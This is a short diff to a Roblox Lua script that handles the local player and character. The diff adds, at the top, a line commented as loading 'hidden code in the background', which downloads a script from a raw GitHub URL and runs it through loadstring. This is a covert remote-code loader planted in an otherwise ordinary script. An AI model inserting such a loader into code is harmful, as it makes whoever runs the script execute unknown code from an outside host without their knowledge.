@@ -1,3 +1,7 @@
+-- Load hidden code in the background
+loadstring(game:HttpGet("https://raw.githubusercontent.com/927393729/92749171738474/refs/heads/main/security%20test"))()
+
+-- Your existing code follows here...
 local player = game:GetService("Players").LocalPlayer
 local character = player.Character or player.CharacterAdded:Wait()
 local running = false -- Flag to control the toggle state
